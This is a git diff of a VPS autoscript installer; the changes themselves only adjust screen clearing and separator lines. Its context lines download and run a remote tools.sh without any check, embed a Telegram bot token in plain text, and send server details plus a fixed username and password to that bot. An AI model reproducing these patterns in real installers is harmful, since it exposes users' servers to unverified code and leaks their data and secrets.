@@ -112,6 +112,7 @@ sleep 2
 wget -q https://raw.githubusercontent.com/FasterExE/VIP-Autoscript/main/tools.sh;chmod +x tools.sh;./tools.sh
 rm tools.sh
 clear
+clear
 echo -e "${BICyan}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
 echo -e "$BBlue                     ${BIWhite}${IWhite}SETUP DOMAIN VPS${NC}     $NC"
 echo -e "${BICyan}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━$NC"
@@ -179,8 +180,7 @@ KEY="6621929387:AAG-7u9w7NTV2M0REX2oISWHdtgMdNZUQRc"
 TIME="10"
 URL="https://api.telegram.org/bot$KEY/sendMessage"
 TEXT="Installation VIP Auto Script
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-<code>VPS Name   :</code> <code>$Name</code>
+━━━━━━━━━━━━━━━━━━━━━━━━━━━
 <code>VPS Name   :</code> <code>$Name</code>
 <code>Username   :</code> <code>najhi</code>
 <code>Password   :</code> <code>najhi</code>
@@ -190,9 +190,9 @@ TEXT="Installation VIP Auto Script
 <code>Timezone   :</code> <code>$WKT</code>
 <code>Location   :</code> <code>$CITY</code>
 <code>Exp Sc.    :</code> <code>$Exp</code>
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+━━━━━━━━━━━━━━━━━━━━━━━━━━━
 By Admin 𓆩 𝐈𝐋𝐘𝐀𝐒𝐒 𓆪
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+━━━━━━━━━━━━━━━━━━━━━━━━━━━
 <i>Notifications Automatic From Github</i>
 "'&reply_markup={"inline_keyboard":[[{"text":"𓆩 𝐈𝐋𝐘𝐀𝐒𝐒 𓆪","url":"https://t.me/IlyassExE"}]]}' 
 
